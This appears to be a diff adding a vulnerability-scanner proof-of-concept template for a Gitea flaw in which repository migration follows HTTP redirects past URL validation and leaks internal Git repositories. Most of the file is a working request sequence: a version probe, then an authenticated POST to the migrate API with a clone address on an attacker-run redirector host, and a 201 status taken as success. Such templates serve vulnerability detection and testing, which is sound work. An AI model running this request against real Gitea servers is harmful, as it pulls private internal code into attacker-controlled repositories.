@@ -1,0 +1,45 @@
+[info]
+author = "AVE"
+description = "Gitea 仓库迁移功能在用户提交迁移URL时进行合法性校验，但实际执行 git clone 时未禁用 HTTP 重定向跟随（默认 http.followRedirects=initial）。低权限认证攻击者可提交通过验证的公开 Git URL，该 URL 将 Gitea 服务端的 Git 子进程重定向至内部或已被禁止的 Git HTTP(S) 端点，导致内部 Git 仓库内容被导入攻击者控制的仓库中。通过向迁移API提交重定向URL并检查是否成功创建仓库来验证漏洞。"
+id = "POC-AVE-2026-0650"
+name = "Gitea 仓库迁移HTTP重定向绕过URL验证导致内部Git仓库泄露 PoC"
+severity = "high"
+tags = ["ave-2026-0650"]
+vuln_id = [
+    "CVE-2026-57894",
+    "GHSA-82f7-87hm-852x",
+    "AVE-2026-0650",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/api/v1/version"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ['"version"']
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/v1/repos/migrate"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"clone_addr":"http://{{redirector}}/repo","uid":1,"repo_name":"poc-redirect-test","service":"git","mirror":false}'
+type = "json"
+
+[poc.requests.headers]
+Authorization = "Bearer {{token}}"
+Content-Type = "application/json"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [201]
+type = "status"
